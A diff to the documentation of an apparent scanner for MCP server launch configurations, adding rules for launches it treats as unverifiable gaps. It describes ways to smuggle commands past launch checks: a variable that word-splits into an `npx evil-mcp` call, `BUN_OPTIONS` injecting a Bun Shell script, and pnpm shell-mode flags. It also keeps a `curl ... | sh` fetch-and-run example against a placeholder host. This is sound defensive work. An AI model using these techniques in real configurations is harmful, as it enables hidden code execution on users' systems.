@@ -159,18 +159,36 @@ A way around a limit that its entry does not describe is worth a
   backslashes and single quotes, so `'npx'` is a gap and `n\px` is a program `px`
   in directory `n`. Anything else is an
   inline shell script: a gap. So `sh -c "npx -y pkg@1.2.3 $HOME/data"` is a gap;
-  pass such values as separate arguments or through `env`.
+  pass such values as separate arguments or through `env`. A program word that is
+  an expansion, such as `$RUNNER`, is a gap that depends on the environment, and so
+  is one that expands before its name, such as `${D}/server`: a shell splits the
+  value of `D` into words, so `D="/usr/bin/npx -y evil-mcp@latest x"` runs npx.
 - **A package manager's own shell reads its script the same way.** `bun exec SCRIPT`
   runs SCRIPT in Bun Shell, and `yarn exec SCRIPT ARGS...` runs it in Yarn's
   portable shell (Yarn 2 and later) with ARGS appended; Yarn 1 starts SCRIPT as a
   program. Neither shell is POSIX, so SCRIPT is classified only when it is a simple
-  command under the rule above with no quoting and no tab. Its words, and the
-  `yarn exec` ARGS, are then a local launch whose arguments are checked like any
+  command under the rule above with no quoting and no tab; Yarn's shell also reads a
+  leading `1=x`, whose name starts with a digit, as an assignment. Its words, and
+  the `yarn exec` ARGS, are then a local launch whose arguments are checked like any
   others; anything else is an inline shell script: a gap. `bun exec` takes one
   script: an option among its words (Bun reads `--cwd` there) or a word after the
-  script is a gap, and so is a `bun exec` or `yarn exec` in another command's
-  arguments. So `bun exec "curl -s https://example.test/x | sh"` is a gap, and
-  `bun exec "node server.js"` and `yarn exec node server.js` are local launches.
+  script is a gap. `yarn exec` accepts Yarn 1's `-s`, `--silent` and `--verbose`
+  before SCRIPT, which change only its output; any other option there is a gap. A
+  `bun exec` or `yarn exec` in another command's arguments is a gap too, and so is
+  `pnpm -c`, `--shell-mode` or `--config.shell-mode` there, which make `pnpm exec`
+  run a shell command line. So `bun exec "curl -s https://example.test/x | sh"` is a
+  gap, and `bun exec "node server.js"` and `yarn exec node server.js` are local
+  launches. A package manager published under another package name is recognised
+  only as `@yarnpkg/cli-dist` (Yarn 2 and later, run as `yarn`) and `@pnpm/exe`; a
+  runner such as `npx` that starts any other package exposing `yarn`, `bun` or
+  `pnpm` takes the package's own name as its program, so that program's `exec` is
+  not read.
+- **`BUN_OPTIONS` is a gap.** Every bun a launch starts, behind any wrapper or
+  runner, adds the words of `BUN_OPTIONS` to its own arguments, so
+  `BUN_OPTIONS="exec 'SCRIPT'"` makes `bun server.ts` run SCRIPT in Bun Shell. A
+  non-empty `BUN_OPTIONS` in a server's `env`, an `env` wrapper or a script
+  assignment is a high `launcher_identity` finding and a gap whatever the command.
+  One set in the environment of the MCP client itself is not seen.
 - **Shell startup code is a gap.** bash sources a `--rcfile` or `--init-file`
   (also spelled `-rcfile`) when it is interactive or its standard input is a socket,
   as MCP clients provide; it imports exported functions (`BASH_FUNC_<name>%%` and its
@@ -199,7 +217,8 @@ A way around a limit that its entry does not describe is worth a
   `ZDOTDIR` or a relative `PATH` entry into the project, or that replaces the
   package (`UV_OVERRIDE`, `UV_CONSTRAINT`, `PIP_CONSTRAINT`), makes the identity
   unknown. Other locations and the runner's own namespace (`UV_*`, `PIP_*`,
-  `YARN_*`, `BUN_*`, `DOCKER_*` and similar) are a medium `package_source`
+  `YARN_*`, `BUN_*` other than `BUN_OPTIONS`, `DOCKER_*` and similar) are a medium
+  `package_source`
   finding, and the package URL is withheld. Configuration names that look like
   tokens or hold one after a prefix (`AWS_AKIA...`) are exported as `[redacted]`,
   and a launcher package whose name or specifier looks like a token is withheld
